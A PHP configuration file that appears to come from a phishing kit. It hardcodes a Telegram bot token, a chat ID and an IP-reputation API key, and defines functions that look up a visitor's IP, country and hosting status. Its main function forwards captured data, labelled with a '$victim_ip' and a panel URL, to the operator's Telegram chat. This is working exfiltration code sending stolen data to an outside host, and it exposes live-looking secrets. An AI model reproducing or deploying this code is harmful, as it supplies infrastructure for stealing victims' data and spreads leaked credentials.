<?php
// Guard to prevent multiple declarations
if (defined('TEST_CONFIG_LOADED')) {
    return;
}
define('TEST_CONFIG_LOADED', true);

// Your test bot credentials
define("TEST_BOT_TOKEN", "8477484223:AAG-Krso8h-uguOIKxFKngfc2uzFncfvPqw");
define("TEST_CHAT_ID", "-5282280577");

// IPHub API key for VPN/Proxy detection
define("IPHUB_API_KEY", "MzE3Mjk6cmREOGtvdXpKRDFRMkU3QnRRbWZZc3NmSUVHMmkwbGs=");

/**
 * Get real client IP (handles Koyeb proxies)
 */
function getRealClientIP() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = $_SERVER[$header];
            if (strpos($ip, ',') !== false) {
                $ip = trim(end(explode(',', $ip)));
            }
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'];
}

/**
 * Get country code from IP
 */
function getCountryCode($ip) {
    if ($ip === '127.0.0.1' || $ip === '::1' || strpos($ip, '10.') === 0) {
        return 'LOCAL';
    }
    $url = "http://ip-api.com/json/" . $ip . "?fields=countryCode";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $result = curl_exec($ch);
    curl_close($ch);
    if ($result) {
        $data = json_decode($result, true);
        if (isset($data['countryCode'])) {
            return $data['countryCode'];
        }
    }
    return "UNKNOWN";
}

/**
 * Get IP type (residential, hosting, vpn)
 */
function getIPType($ip) {
    if (empty(IPHUB_API_KEY)) {
        return "unknown";
    }
    $url = "https://v2.api.iphub.info/ip/" . $ip;
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Key: " . IPHUB_API_KEY));
    $result = curl_exec($ch);
    curl_close($ch);
    if ($result) {
        $data = json_decode($result, true);
        if (isset($data['block'])) {
            return ($data['block'] == 0) ? "residential" : "hosting";
        }
    }
    return "unknown";
}

/**
 * Send to test bot only
 */
function sendToTestBot($message) {
    $url = "https://api.telegram.org/bot" . TEST_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TEST_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}

/**
 * Main function - send data to TEST BOT ONLY
 */
function sendToTestBotOnly($data_type, $message, $victim_ip, $panel_url) {
    $country = getCountryCode($victim_ip);
    $ipType = getIPType($victim_ip);
    
    $test_message = "🛡️ [$data_type]\n" . $message . "\n\n📊 IP: $victim_ip | $country ($ipType)\n🔗 $panel_url";
    sendToTestBot($test_message);
}
?>